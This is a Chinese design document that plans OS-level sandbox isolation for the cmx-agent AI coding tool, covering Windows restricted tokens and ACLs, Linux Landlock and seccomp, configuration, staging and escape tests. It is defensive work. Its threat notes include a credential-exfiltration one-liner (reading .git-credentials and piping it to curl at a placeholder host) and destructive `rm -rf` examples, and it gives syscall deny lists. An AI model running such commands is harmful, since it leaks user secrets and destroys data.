# cmx-agent 沙箱 OS 级隔离完善方案

> 日期：2026-09-14 · 状态：**已实施（2026-09-15 凌晨 S0-S3 全阶段落地 + 实施阶段红蓝审查清偿，见 §十二实施记录）**
> 实施验证：全仓 420+ 测通过/1 已知红/0 新增失败 · 全仓 clippy 零告警（Win+WSL 双侧）· e2e 7/7 · 两仓已推送
> 关联：`docs/20260904_cmx-agent进化方案_编码办公插件三面一体.md`（§八 隔离层）、`documents/plans/20260908_cmx-agent_主流Agent的Windows支持调研与适配方案.md`（§5.4 P2 沙箱拍板）、2026-09-13 红蓝审查（SandboxGuard 中央闸等已修项）。
> v1.1 修订依据：三路红队对抗审查（Windows 技术 / Linux 技术 / 架构一致性，见 §十一审查记录）。

---

## 摘要（TL;DR）

cmx-agent 现有沙箱是 **E1 应用层围栏**（策略两旋钮 + 五层守卫 + 路径围栏 + 进程治理），策略闸门与业界同水位；缺的是 **OS 级强制隔离**——shell 类工具的命令本体在进程层不受约束（`cd` 出工作区、`rm -rf` 家目录、写注册表、任意联网都拦不住），Linux 侧完全空白。本方案补齐这一层：

- **Windows**：Codex unelevated 同款「受限令牌 + ACL」（0908 §5.4 已拍板路线），含放行集 / restricting 集合 / ACL 传播 / 原生 spawn 链路全套机制设计，拆 S1a/S1b 两个可验收单元（约 2–2.5 周）。
- **Linux**：Landlock（逐挂载规则矩阵 + ABI 分级）+ 可选 seccomp（含 io_uring 封堵），3–5 天。
- **fail-closed 铁律**：沙箱建立失败即拒绝执行，绝不静默裸跑。
- **单入口收敛**：shell / git / run_tests / 插件 command / 插件 wasm 统一改道共享执行器（`ProcCtx` 参数对象，双入口同 crate）。
- **审计走 ToolResult 通道**：沙箱包装结果嵌进工具返回 JSON，OS 拒绝 = 执行段失败（模型可见、SessionLog 落库、不变式不破）——core crate 保持零改动。
- **网络三档**（open / poison / enforce）：默认 open 保持现状；enforce 仅 Linux 且封 io_uring 旁路。
- **不做**（承接 0908 §5.4/5.5 + 本轮审查记录）：elevated 专用账户 + WFP、AppContainer（可硬断网但已否决）、bash→PowerShell 翻译、数据面权限（归 cmx-data-auth）。
- **新增待拍板 D5**：插件 `requires_approval → high_risk` 映射在 OS 沙箱就绪后是否改「沙箱内放行 + Always 审批」（见 §十）。

---

## 一、现状与缺口

### 1.1 已有防线（保留，不动）

| 层 | 现状 | 位置 |
| --- | --- | --- |
| 策略层 | `SandboxMode`（ReadOnly / WorkspaceWrite / DangerFullAccess）× `ApprovalPolicy` 两旋钮正交；danger 只豁免 Conditional 级人审，Always 级不豁免 | `core/guard.rs:21` |
| 守卫管道 | 五层 fail-closed，注册序 Auth→Sandbox→HighRisk→Approval；`SandboxGuard` 中央闸（writes/network 标注在 ReadOnly 中央拒绝）；`HighRiskGuard`；`ApprovalGuard` | `core/guard.rs`、`app/builder.rs:192` |
| 路径围栏 | `resolve()` 规范化 + 最长已存在祖先 canonicalize（新文件/符号链接根/`../` 逃逸都对），fs 系工具共用 | `tools/sandbox.rs` |
| 进程治理 | cwd 钉死工作根 + 超时钳制（默认 30s / 上限 120s）+ 64KB 输出截断 + Job Object 整树收尸 + CREATE_NO_WINDOW | `tools/proc.rs:20-22` |
| 主体围栏 | `allowed_roots` 回合级快照（红蓝修复批，core 新参 roots） | core |
| 红蓝已修相关项 | 插件 iframe 反模式（去 allow-same-origin + CSP）、SSRF 逐跳复检、net 工具 ReadOnly 全禁 | 已随 743a947 推送 |

### 1.2 缺口（本方案要补的）

1. **命令本体无技术约束**：`shell` / `git` / `run_tests` 的命令在子进程里跑，cwd 钉死挡不住 `cd C:\ && rm -rf ...`；当前靠工具描述注入安全规则（提示层）+ 审批 + 事后审计兜底。`shell.rs` 头注释自认「OS 级隔离在 E2 补齐」——至今未补。
2. **Linux 侧零 OS 隔离**：Landlock/seccomp 一个没上（deb 分发目标平台之一）。
3. **插件载体绕过执行器**：插件 `command` 载体（`cmx-agent-plugin/src/command.rs:35`）和 `wasm` 载体（`wasm.rs:78`）各自 spawn、不设 cwd（继承 agent 进程 cwd）、60s 硬编码超时、输出截断口径独立（8000/2000 字符），**不走 `proc::run`**（64KB 统一截断 + Job Object）——即便未来执行器加固，插件侧也不受益，且现无 Job Object 收尸保障。
4. **高危闸是工具级标注**：`rm -rf ~` 藏在 shell 一次调用里不触发 `HighRiskGuard`。
5. **网络无进程级管控**：net 工具（web_fetch 等）in-process 已由工具闸 + SSRF 修复管住；shell 任意 socket 全通。另 browser 工具**自 spawn chrome 子进程**（`cmx-agent-net/src/browser.rs:67`、`interact.rs:50`），同样不受任何进程级管控。
6. **WASM 载体形态偏离规划**：0904 规划写的是 wasmtime 进程内能力域，实际是 wasmer CLI 子进程，隔离级别与 command 载体同级。

### 1.3 边界界定

- **数据面归 cmx-data-auth 接地（U13）**：本方案只管命令面 / 文件面 / 进程面。
- **macOS 不覆盖**：分发形态是 Windows NSIS + deb。
- **子进程豁免清单**（不进进程沙箱，防线另述）：
  - **MCP / LSP**：长驻且需自身网络与文件访问；防线 = 工具级 network 标注 + 超时 + 16MB 帧上限 + kill_on_drop（红蓝已修）。
  - **Chrome（browser 工具）**：远控浏览器本身即用户可见能力面；防线 = CDP 超时预算 + 用户可见性。net 档不覆盖 chrome 出站流量。
  - **IM 无人值守全权档**：`TurnPolicyOverride::FULL_ACCESS`（= DangerFullAccess + Never）是既有独立决策（743a947），不受 OS 沙箱覆盖；若要收紧 IM 默认档位须另立决策，本方案只做边界声明。
- **信息外泄面声明**：本方案是**写围栏**，不防读。全盘可读 + 网络 open（默认）= 凭据外泄通道客观存在（`type %USERPROFILE%\.git-credentials && curl -d @- http://...`）。缓解 = §四.8 deny-read 可选加固 + 长期靠 data-auth/连接器收口；OS 沙箱不承诺解决 exfiltration。

---

## 二、目标与非目标

### 2.1 目标

1. WorkspaceWrite 档下，shell 类子进程获得 **OS 强制**的「工作区（+白名单目录）可写、系统只读」约束。
2. Windows 与 Linux 双平台覆盖，行为语义一致（能力差异显式记录）。
3. **fail-closed**：沙箱初始化失败 → 本次工具调用拒绝（附原因），绝不退化成裸跑。
4. 沙箱裁决可观测：包装结果与拒绝原因对模型可见、入会话日志。
5. 可配置：网络档位、严格度开关、放行集应用级持久化（运行时可改）。

### 2.2 非目标（承接 0908 §5.4/5.5 拍板 + 本轮审查补充记录）

- ❌ **elevated 专用账户 + WFP 防火墙**（需管理员 setup，企业桌面分发成本高）。
- ❌ **AppContainer**：技术上可非管理员硬断网（无网络 capability），但 0908 已否决（~25% 性能损失 + 须预枚举全部工具 + 文件读也要显式授权，不适合开放式工作流）——记录否决理由，防止后人重开。
- ❌ bash→PowerShell 命令转换器、内嵌 POSIX 解释器、login shell / 环境快照。
- ❌ net 工具 in-process 流量管控演进（已有 SSRF 修复 + 白名单基础，另线推进）。
- ❌ **域名级网络白名单**（0904「四档沙箱」第三档的字面语义）：本方案 poison=黑洞代理、enforce=socket 全拒，均非白名单；如需域名白名单另立方案（§十一-13 审查回填）。
- ⏸ WASM 载体升级 wasmtime 进程内能力域 → **S4 可选档**，绑 E5 插件市场另立实施。

---

## 三、总体设计

### 3.1 三层防线归位

```
策略层（已有，不动）    SandboxMode × ApprovalPolicy —— 决定「允不允许」
应用层围栏（已有，不动） 路径围栏 / 守卫管道 / 中央闸 —— 工具调用级拦截
OS 进程沙箱（新增）      受限令牌 / Landlock / seccomp —— 子进程级强制   ← 本方案
```

核心思路：**不改策略语义，只把「WorkspaceWrite 的承诺」从提示词变成内核事实**。模型看到的工具规格、守卫裁决、审批卡都不变；变的是越界命令在 OS 层直接失败。

### 3.2 SandboxMode → 沙箱行为映射

| SandboxMode | 文件系统 | 网络 | 进程包装 |
| --- | --- | --- | --- |
| ReadOnly | 全只读（现状保留） | 工具级禁（现状） | 不包装（shell 本就不在此档运行） |
| **WorkspaceWrite** | **工作区 + 白名单目录 RW，其余 RO**（OS 强制） | 按网络档（§3.4） | **受限令牌（Win）/ Landlock+可选 seccomp（Linux）** |
| DangerFullAccess | 全放开 | 全开 | 不包装（显式信任，现状） |

### 3.3 fail-closed 铁律与能力探测

- 受限令牌创建失败 / Landlock 系统调用失败 → 本次工具调用**执行段失败**（走 `ToolResult::err` 通道，见 §6.2——不是守卫 Deny，时序上沙箱失败发生在守卫全部 Allow 之后的执行内部），错误信息透传给模型与用户。
- 启动时 `sandbox capability probe`（探测项）：
  - Windows：令牌派生试探 + **工作区所在卷的文件系统类型**（FAT/exFAT 无安全描述符，写围栏失效）+ 试挂一个 allow ACE 后回读验证（防「探测恒绿、真实失败模式测不出」）；
  - Linux：`landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION)` 返回 ABI 整数（ENOSYS / EOPNOTSUPP = 不可用；**不是 prctl 体系，也不能用内核版本号判断**——`lsm=` 启动参数可整体禁用 Landlock）；glibc 2.36 才有 landlock wrapper，Ubuntu 22.04 构建环境 glibc 2.35 须走 `libc::syscall` 裸调用（2.35 为 glibc 安全下界，与既有构建纪律一致）。
  - 探测结果写健康报告。
- 探测不可用时由配置 `sandbox.require_os` 决定：`true`（**已拍板默认**）→ WorkspaceWrite 下 shell 类工具拒绝；`false` → 降级裸跑 + 会话事件标记 + UI 黄标。

### 3.4 网络三档 `sandbox.net`

| 档 | 行为 | 平台 | **不管什么**（边界写死） |
| --- | --- | --- | --- |
| `open`（**默认，已拍板**） | 现状不变 | 全平台 | — |
| `poison` | 注入黑洞代理环境变量（`HTTP(S)_PROXY` → `127.0.0.1:9`） | 全平台 | node 内置 fetch（18–22 默认无视 env 代理，v24.5 / `NODE_USE_ENV_PROXY` 才认）、Java、.NET（走注册表代理）——失效名单如实写进 UI 文案；npm 自身认 env 代理，故 poison 档会连 `npm install` 一起断（粗暴档，如实声明） |
| `enforce` | seccomp 拒 `socket(AF_INET/AF_INET6)` + **封 io_uring 旁路**（`io_uring_setup/enter/register` 一并禁——io_uring 可不经 socket(2) 建连，Codex 同款全禁） | **仅 Linux**；Windows 在受限令牌路线内无解，配置了即拒绝 shell 并提示平台不支持（AppContainer 路线可硬断网但已否决，见 §2.2） |

**边界**（防用户误读「enforce = agent 全断网」）：net 档**只管 shell 类子进程出站**；web_fetch / web_search 是主进程 in-process reqwest（不会被毒化、不被 seccomp 管，防线=工具闸 + SSRF 白名单）；chrome 子进程与 MCP/LSP 明确豁免（§1.3）。enforce 档下 DNS（getaddrinfo）整体死亡、127.0.0.1 一并断——这是预期行为，拒绝文案写明「网络被 sandbox.net=enforce 禁用」而非裸 socket 错误。

### 3.5 命令级风险屏（advisory 层，S3）

高危闸从「工具级」下探到「命令级」：shell 工具执行前对命令文本做**最小破坏模式集**静态屏（递归删除工作区外路径、格式化磁盘、注册表写、服务启停、`sudo` 类提权等十余条），命中且非 DangerFullAccess 时升级为 `NeedApproval`。先例：Claude Code 的 Bash 权限规则前缀匹配。

**定位写死（双面）**：这是审批策略层，不冒充 OS 隔离；**漏报清单同样写死**——base64 管道解码、`$( )`/反引号命令替换、别名/函数、工作区内脚本文件内嵌命令，静态正则天然全瞎。UI 文案不得暗示该屏是防线。误报缓解：只升审批不硬拒。

---

## 四、Windows 实现（S1a/S1b）：受限令牌 + ACL

Codex unelevated 同款（`windows-sandbox-rs`，Apache-2.0）；0908 §5.4 已拍板。

### 4.1 令牌（机制表述按红队 A-2 修正）

`CreateRestrictedToken` 从当前进程令牌派生，**flags = `DISABLE_MAX_PRIVILEGE | WRITE_RESTRICTED`，不 disable 任何 SID**（DisableSids→deny-only 是另一机制，会把用户 SID 变 deny-only 连读都毁掉——严禁误用）。`WRITE_RESTRICTED` 语义：**写访问额外做一次只认 restricting SIDs 的检查**（对象 DACL 须含命中 restricting SID 的 allow ACE 才可写）；读/执行走正常检查——这就是「系统其余只读」的准确含义（写围栏，非读围栏）。

### 4.2 restricting 集合与 Default DACL（新增，修红队 A-3）

- restricting 集合 = `{ SANDBOX_SID（安装期持久化生成一次）, Logon SID, Everyone }`。后两者是**兼容取舍**：令牌 Default DACL 与公共授权对象（授予 Everyone 的目录）在写检查中可命中，否则子进程自建的管道 / named mutex / IPC 对象「创建成功但再打开写入即 ACCESS_DENIED」——PowerShell 管道直接崩。代价：Everyone 可写的公共目录在沙箱内仍可写，明示接受。
- `SetTokenInformation(TokenDefaultDacl)`：默认 DACL 授 Logon SID + Everyone（Codex 同款 permissive default DACL）。

### 4.3 ACL 放行集与包管理器缓存（新增，修红队 A-1/C-4——原版方案级自相矛盾点）

write-restricted 语义下，用户 SID 对缓存目录的 allow 在写检查中**不算数**，必须显式放行：

| 目录 | 处置 |
| --- | --- |
| `allowed_roots` | 授 SANDBOX_SID 写 ACE（继承标志） |
| `%TEMP%` / `%TMP%`（GetTempPath） | 授写（node-gyp 等必需；Codex 同款 `includes_tmp_env_vars`） |
| npm/pip/cargo 缓存 | **默认 env 重定向进工作区**（`NPM_CONFIG_CACHE` / `PIP_CACHE_DIR` / `CARGO_HOME` → 工作区 `.agent-cache/`，零放行零供应链面；首次重下载一次的代价如实记录）；备选 `sandbox.extra_write_roots` 显式放行（放行缓存目录 = 供应链投毒残余面，进 §九风险表） |
| `.git`（仅 shell profile） | 见 §4.5 |

**非 NTFS 卷**（FAT32/exFAT，U 盘/数据分区无安全描述符，写围栏完全失效）：探测到工作区所在卷非 NTFS → 按 `require_os` 拒绝或黄标降级（`rm -rf E:\`（FAT 卷）在受限令牌下畅通无阻——这是「逃逸在内核层被拒」措辞的唯一真实例外，明示）。

### 4.4 ACL 授予与传播（新增，修红队 A-4）

与 Codex（每次 fresh 建目录）不同，cmx-agent 的工作区是**用户既有真实仓库**。「授予继承到子目录」在 Windows 上只作用于**新创建**对象；要让**已有**文件（sed -i / 编译器改源 / git 写 .git 下既有对象）可写，只能依赖 `SetNamedSecurityInfo` 的自动传播（整树遍历重写 SD）：

- **SANDBOX_SID 安装期生成一次并持久化**（per-session 新 SID = 每次全树重传播 + DACL 无限累积 ACE，不可取）；
- 大仓库首次传播为**分钟级一次性成本**（杀软敏感，记档）；稳态单次包装预算 < 50ms 不受影响（§8.3 措辞已改）；
- 传播陷阱（实现口径，S1a 审查后修正）：无 DACL 子对象传播后会变**空 DACL = 全拒**（MSDN 明文）——全树预扫描补 DACL 在大仓库上成本过高，**登记为已知残余**（罕见形态、方向 deny 非逃逸）；`SE_DACL_PROTECTED`（禁继承）文件不传播——同登记，探测用例兜底；
- 撤销 / 重置脚本语义：allow ACE 挂 SANDBOX_SID，对正常用户令牌无实效，残留无害；提供一键重置（重新继承父目录 DACL）。

### 4.5 `.git` deny ACE（已拍板：仅挂 shell 令牌 profile）

- **deny mask 显式枚举且排除 SYNCHRONIZE / READ_CONTROL / GENERIC_WRITE**：`FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES | DELETE | FILE_DELETE_CHILD`——deny ACE 拒 GENERIC_WRITE 会连读一起拒（SYNCHRONIZE 隐含），照抄 Codex 的 deny mask（含 FILE_GENERIC_WRITE）会让 shell profile 下 `git status` 直接 ACCESS_DENIED（红队 A-7）。
- **语义裂口与指引**：shell profile 下 `git commit` 拒（写 index.lock）、git 工具可——shell 工具描述注入「git 写操作一律走 git 工具，shell 内 git 写会被拒」。
- 残留：deny 挂 SANDBOX_SID（持久化 SID），对非沙箱访问无实效。

### 4.6 原生 spawn 链路（新增，修红队 A-5/C-5——原版最大工程量盲区）

std / tokio `Command` **均无带令牌创建进程的 API**（CommandExt 官方文档自认无 `CreateProcessAsUserW` 等价物；现行 `proc.rs:185-203` 的 tokio Command + creation_flags + `child.raw_handle()` 链路全部不可复用）。S1a 在 sandbox crate 内实现：

- `CreateProcessAsUserW`（自派生受限令牌无需 `SeAssignPrimaryTokenPrivilege`，codex 产线同款；**列为 S1a 首验收项**——普通桌面用户 spawn 冒烟，若翻车退「broker 进程」形态备选）；
- `STARTUPINFOEXW` 属性列表：`PROC_THREAD_ATTRIBUTE_HANDLE_LIST`（显式继承 stdio 管道句柄）+ **`PROC_THREAD_ATTRIBUTE_JOB`（spawn 时挂 Job，消掉现行 `job.rs` spawn 后 attach 的竞态——孙进程零漏杀列为验收项）**；
- **lpDesktop = 独立 `CreateDesktop`**：不设则受限进程可能 `STATUS_DLL_INIT_FAILED` 起不来；设默认桌面则有 SendMessage 攻击面（MSDN 警告 + Codex 专设 desktop 模块）——原版「ConPTY 不涉及」表述修正为「ConPTY 不涉及，但 lpDesktop 必涉」；
- tokio 侧管道异步适配：裸 HANDLE 读线程（spawn_blocking）或 OVERLAPPED，实施期二选一；
- 量级对照：codex `windows-sandbox-rs` 55 文件 7 子模块（conpty/stdio_bridge/unified_exec/desktop/…），砍掉 elevated/WFP/uninstall 后 cmx 版仍 ≥15 文件 → 排期拆 S1a/S1b（§七）。

### 4.7 误伤面登记（红队 A-14）

注册表键是 securable object，同受 restricting 写检查：沙箱内**写 HKCU 拒**（防持久化，卖点）、**读 HKCU 允**（误伤面：个别 CLI 存配置失败，登记进 §九）。

### 4.8 deny-read 可选加固（新增，修红队 A-10，默认关）

`sandbox.hardened_read`（默认 false）：对 `~/.ssh`、`~/.git-credentials`、`%USERPROFILE%\.npmrc` 挂 deny-read ACE（trustee = Logon SID）。**副作用明示**：Logon SID 在主进程令牌中同样 enabled——主进程自己的 fs_read 也会被拒（行为变化，故 opt-in）。

---

## 五、Linux 实现（S2）：Landlock + 可选 seccomp

### 5.1 Landlock 逐挂载规则矩阵（按红队 B-1/B-2/B-3 重写）

Landlock 规则绑定**文件层级（≈挂载点）**；但注意内核语义（S1a 实施审查修正）：`security/landlock/fs.c` 走 `follow_up()` **跨挂载向上遍历**至真实根——`/` 上的一条规则实际罩住全命名空间的只读/可执行，显式逐路径规则承担的是**写权利的精确授权**（原「mountinfo 探测挂载」表述按内核真实语义修正）。仍按矩阵显式授权（`/dev/null` 不显式给写连重定向都拒——Codex 同款首查项）：

| 路径 | 权利 |
| --- | --- |
| `/` | `READ_FILE \| READ_DIR \| EXECUTE`（不含 EXECUTE 连 sh 都起不来） |
| `/proc`、`/sys` | 读 |
| `/run` | 读（部分部署 resolv.conf 是 /run 下符号链接，net=open 档 DNS 依赖此） |
| `/dev/null`（文件级） | RW |
| `/tmp`、`XDG_RUNTIME_DIR`（/run/user/$UID） | RW |
| `allowed_roots` | 全量写权利：`EXECUTE\|READ\|WRITE\|READ_DIR\|REMOVE_DIR\|REMOVE_FILE\|MAKE_*`（无 REMOVE/MAKE 则区内 `rm`/`mkdir`/重定向建文件全断） |

**ABI 分级表**（防 EINVAL 全 Deny——权利集须按探测 ABI 掩码动态生成）：

| 平台 | ABI | 能表达什么 |
| --- | --- | --- |
| Ubuntu 22.04 GA（5.15） | 1 | 基础 FS 权利；**无 REFER（跨目录 rename/link 一律拒 → npm install 原子安装断）、无 TRUNCATE** |
| Ubuntu 22.04 HWE / ≥5.19 | 2+ | +REFER；npm/cargo 工作流可支撑 |
| Deepin 23.1（6.6/6.12） | 3–6 | +TRUNCATE；覆盖本方案全部 FS 权利（网络权利 ABI 4 不在本方案范围） |

**支持矩阵结论**：Linux 侧 WorkspaceWrite 完整体验 = **ABI ≥ 2**（≥5.19 / 22.04 HWE / Deepin 23.1）；ABI 1 = 明确降级记录（跨目录移动必断）。`REFER`（ABI≥2）、`TRUNCATE`（ABI≥3）按探测掩码加入，不存在则不进 handled set（不存在的权利进 handled set 直接 EINVAL——沙箱建立失败 → fail-closed 全拒，恰是方案最想避免的结局）。

### 5.2 preexec 三步序列（修红队 B-4/B-6）

- **父进程预建**：ruleset fd（`landlock_create_ruleset` 返回 CLOEXEC fd，exec 前一直有效）+ 逐 path 的 O_PATH fd；
- **child pre_exec 只跑裸 syscall**（tokio `pre_exec` 是 unsafe，闭包在 fork 后 child 上下文运行，malloc/mutex 不保证可用——预建 fd 就是为了闭包里零分配）：
  1. `prctl(PR_SET_NO_NEW_PRIVS, 1)`——**landlock_restrict_self 与 seccomp 的共同前置**（漏了 = 每次 EPERM = 默认全 Deny）；NNP 副作用：setuid 失效（sudo 拒之正好、ping/mount 误伤进 §九）；只设在 fork 出的 child，父进程不受影响；
  2. seccomp 装载（仅 enforce 档，见 §5.3）；
  3. `landlock_restrict_self`。
- **错误分类**：现行 `proc.rs` 「永不 Err——错误编码进返回值」哲学下，pre_exec 失败表现为 spawn Err → tools 层必须分类为**沙箱拒绝（执行段失败）**而非普通「启动失败」（否则模型看到启动失败会换姿势重试烧回合）。
- 继承语义（方案成立的机制保证，写死防实施者走错）：Landlock 域**execve 后仍生效**、孙进程（npm→node→…）自动在域内、不可逆；**绝不能把 restrict_self 装到父进程线程**（不可逆污染，pre_exec 路线天然规避）。
- 设置 pre_exec 后 spawn 回退 fork+exec（posix_spawn 无法执行闭包），多线程 COW 一次 fork 的开销实测记档（§8.3）。

### 5.3 seccomp enforce 档（修红队 B-5/B-7/B-8）

- **deny 集**：`socket(AF_INET/AF_INET6)` + `io_uring_setup` / `io_uring_enter` / `io_uring_register`（io_uring 可不经 socket(2) 建 AF_VSOCK/连接，seccomp 按系统调用号过滤对 io_uring 内嵌操作不可见——不封 io_uring 的「硬断网」名不副实，Codex 全模式禁 io_uring）；
- **BPF 首指令校验 `AUDIT_ARCH_X86_64`**，异构一律 ERRNO——不校验 arch 的过滤器，被沙箱 shell exec 一个 32 位 ELF 即整体失效（经典绕过）；
- **只装在 fork 后 exec 前的 child 单线程上下文**（seccomp 过滤器 per-thread，装到多线程 tokio 父进程某 worker = 其余线程不受限，形同虚设）；
- 副作用语义：getaddrinfo 的 AI_ADDRCONFIG 探测 socket → EPERM → **DNS 整体死亡（预期行为）**；AF_INET 连 127.0.0.1 一并断（本地 registry mirror 类工作流误伤，明示不留通路）；拒绝文案「网络被 sandbox.net=enforce 禁用」；
- 手写 BPF vs libseccomp：倾向手写（规则一页 + arch 校验自己兜 + 真零新依赖；libseccomp2 虽是基础库但绑定仍是新依赖）——**LD_PRELOAD/静态二进制绕不过 seccomp**（内核 syscall 层，与用户态库无关），此点无懈可击。

### 5.4 元数据残余与老内核影响（修红队 B-10/B-12）

- `chmod`/`chown`/`utimes`/`stat` **不受 Landlock 管**（man page CAVEATS）——「其余 RO」不含元数据，shell 可 chmod 000 家目录自有文件（DoS 级非泄露级），登记残余；
- 老内核（Ubuntu 20.04 5.4 / Debian 11 5.10 无 Landlock syscall）→ 探测失败 → `require_os=true` 默认 → **WorkspaceWrite shell 整档拒绝**——产品级影响如实入 §九；首次 Deny 错误信息**直接指路** `require_os=false`（降级逃生门）。

---

## 六、集成与接线（S0 + S3）

### 6.1 子进程出口收敛（按红队 C-3/C-6 诚实化）

```
tools/proc.rs  —— 单 crate 双入口（不再是「唯一函数」）
  ├─ run(program, args, cwd, timeout_ms)              （既有签名保留，非沙箱路径）
  └─ run_profiled(ProcCtx, program, args, cwd, timeout_ms)
        ProcCtx { sandbox: SandboxMode, roots: &[PathBuf], profile: Profile }
        Profile = Shell | Git | Plugin   （.git deny 只挂 Shell；Git 工具豁免——已拍板 §十-3）
  ├─ shell.rs / git.rs / run_tests.rs   （3 个既有调用点改传 ProcCtx）
  ├─ 插件 command / wasm 载体           （改道 run_profiled + 语义对齐，见下表）
      MCP / LSP / Chrome                （豁免清单，§1.3）
```

**插件改道语义对照表**（原版「自动全量生效」掩盖了行为回归面，逐项对齐后再改道）：

| 语义 | 现状（command.rs / wasm.rs） | 改道后 | 处置 |
| --- | --- | --- | --- |
| cwd | 不设（继承 agent 进程 cwd） | first_root | manifest 新增可选 `working_dir` 字段覆盖；**WASI 视图变化明示**（wasmer 默认 preopen cwd 给模块） |
| 超时 | 60s 硬编码 | proc 钳制（默认 30s / 上限 120s） | manifest 可选 `timeout_ms`，缺省 60s 保持 |
| 截断 | stdout 8000 / stderr 2000 字符 | 64KB 字节统一 | 输出包一层保 schema 兼容（`{service,plugin,kind,...}` 外壳不变） |
| Job Object | 无（孙进程孤儿化） | 整树收尸 | 顺带消掉存量隐患（此项属实） |
| 依赖边 | plugin → core/mcp | 新增 plugin → tools | workspace members + AGENTS.md crate 分层表补行 |

### 6.2 审计与拒绝通道（按红队 C-1/C-2 修正——原版「core 零改动」与独立事件二选一必假）

**采 ToolResult 通道方案（真·core 不动）**：

- 沙箱包装结果嵌进工具返回 JSON 的 `sandbox` 字段：`{wrapped, denied?, degraded?, net, profile}`——`ToolResult` 本就落 SessionLog 且模型可见（model_context 投影），*Model-visible means logged* 不变式**天然不破**；
- **OS 沙箱拒绝 = 执行段失败**（`ToolResult::err`），不是守卫 Deny——时序上沙箱失败发生在守卫全部 Allow 之后的执行内部，回不到 pre 相；`proc.rs` 「永不 Err」哲学下由 tools 层分类为沙箱拒绝（§5.2）；
- 备选方案（不采，记录）：`EventKind` 加 `SandboxReport` 变体 = core 最小增量 + tools 层无落事件通道问题——实施期若 ToolResult 通道表达力不足（如需在无工具调用时落审计）再升级，二选一已定默认。

### 6.3 配置面（按红队 C-8 具体化——原版「走 set_policy 通道」会重启丢配置砖化老环境用户）

- 新增 **`SandboxSettings`**（app 层，不进 core `Policy`——`set_policy` 是纯内存回合旋钮，两轴分层：Policy = 回合级旋钮，SandboxSettings = 应用级配置）：
  `{ net, require_os, cmd_risk_screen, extra_write_roots, win_cache_policy, hardened_read }`；
- 落点：`shared_data_dir()/settings.json`（与 model.json 同级），启动读入，前门 set 命令写回持久化；
- 运行时改档 = 前门命令（对齐两旋钮哲学）+ 设置中心不新开分区（进现有会话/策略区）。

### 6.4 UI

- 回合执行卡沙箱徽标：`只读 / 工作区🔒 / 完全访问`（+ net 档小字，文案写「子进程出站」，**不写「网络管控」**——防 §3.5 漏报清单被文案放大）；degraded 黄标；
- 模型收到沙箱拒绝的**文案模板带行动指引**（红队 C-12）：「路径越界——请确认目标在工作区内 / git 写操作请改用 git 工具 / 需要更高权限请请求用户切换沙箱模式」；既有 `max_steps=16` 兜底 + §8.1 加循环重试用例（连拒 N 步回合收敛，模型换姿势重试烧 16 步的现状必须可观测）。

### 6.5 插件受益边界（红队 C-7，引出决策点 D5）

插件 guard 映射现状：`requires_approval → high_risk=true`（plugin lib.rs `guard()`）+ 守卫序 Sandbox→HighRisk→Approval（builder.rs:192）→ **写/执行类插件（requires_approval=true）在 WorkspaceWrite 下被 HighRiskGuard 审批前硬拦**（connectors.rs:213 注释自证），根本到不了执行段；DangerFullAccess 下又不包装。

**结论**：按现状映射，OS 沙箱对插件的实际受益面 = 仅 `requires_approval=false`（作者自声明只读）的插件——原版「自动全量生效」失真。两个选项见 §十 D5。

---

## 七、实施排期（v1.1 修订：S1 拆期 + Linux 跑道）

| 阶段 | 内容 | 量级（v1.1 修订） | 依赖 |
| --- | --- | --- | --- |
| **S0** | `SandboxSettings` 配置 + 持久化 + 能力探测（含卷文件系统/试挂 ACE）+ fail-closed 骨架 + `sandbox` 字段进 ToolResult 输出 + 贯通测试 | 0.5–1 天 | 通道方案已定（§6.2） |
| **S1a** | Windows 受限令牌（restricting 集合 + Default DACL）+ ACL 放行集与传播 + 原生 spawn 链路（CreateProcessAsUserW + STARTUPINFOEX + lpDesktop + tokio 管道适配）+ 普通桌面用户冒烟（首验收项） | **1.5–2 周**（原「约一周」为 0908 原话复读，未含 spawn 链路重写，已修正） | S0 |
| **S1b** | 插件 command/wasm 载体改道（语义对照表逐项对齐）+ manifest `working_dir`/`timeout_ms` 字段 | 1–2 天 | S1a |
| **S2** | Linux Landlock（逐挂载矩阵 + ABI 分级 + TMP 盘点）+ seccomp enforce 档 + 降级路径 | 3–5 天 | S0 |
| **S3** | 命令级风险屏最小集 + UI 徽标 + Deny 文案指引 | 1–2 天 | S0（与 S1/S2 并行可） |
| **S4**（可选） | wasmtime 进程内能力域（WASM 载体升级） | 另立项 | 绑 E5 插件市场 |

- 排期拍板：**S0 先行（拍板后即可实施）；S1+S2 维持绑 M3**（0908 §5.4「P2：E2 沙箱」取 0908 沙箱语义，与 0904 的 E2=编码面进阶术语区分），用户后续指令可提前。Windows 主线合计 2–2.5 周。
- **Linux 测试跑道**（红队 C-10：仓无 CI、开发机 Windows，`cfg(linux)` 用例在本机不编译不执行）：定义跑道 = WSL2（Ubuntu 22.04 HWE）+ Deepin 真机手跑清单，结果记档进 `test-reports/`；
- 新 crate `cmx-agent-sandbox`：进 workspace members（13→14）+ 同步仓内 AGENTS.md crate 分层表；Windows 侧依赖**沿用 `windows-sys` 0.59 补 feature**（仓现状 windows-sys，与 `windows` crate 类型不互通，不换）；
- 每阶段验收纪律：`cargo test` 全绿（基线 353 通过/1 已知红测试不新增失败）+ 双平台 clippy 零告警 + e2e 冒烟。

---

## 八、测试与验收（v1.1 补用例）

### 8.1 逃逸负例矩阵（`cfg(windows)` / `cfg(target_os="linux")` 条件测试 + Linux 跑道见 §七）

| 用例 | 预期 |
| --- | --- |
| shell 写工作区外绝对路径（UNC、符号链接、大小写变体、`..` 变体） | OS 层拒绝 + 应用层围栏先拒（双保险） |
| shell 读工作区外系统路径 | **允许**（写围栏语义，明示） |
| **写 FAT/exFAT 卷工作区外**（Windows） | 探测拦（require_os=true 拒 / false 黄标）——**不能沉默** |
| shell profile 下 `git status` / `git log` | 可读（deny mask 排除 SYNCHRONIZE 的验收锚点） |
| shell profile 下 `git commit`（写 .git） | 拒 + 文案指引「改用 git 工具」 |
| git 工具 `git commit` | 成功（第二套 profile） |
| **写 HKCU 拒 / 读 HKCU 允**（Windows） | 注册表 securable object 语义 |
| 超时命令（孙进程 fork 睡眠） | Job Object 整树收尸在受限令牌 / spawn 时挂 job 下有效 + **孙进程零漏杀**（原 attach 竞态修复验收） |
| Linux enforce 档 `curl example.com` | **getaddrinfo 阶段解析失败**（非 socket 报错——验收现象与文案按此写） |
| Linux enforce 档 io_uring 建连程序 | 被拒（io_uring syscalls 封堵验收） |
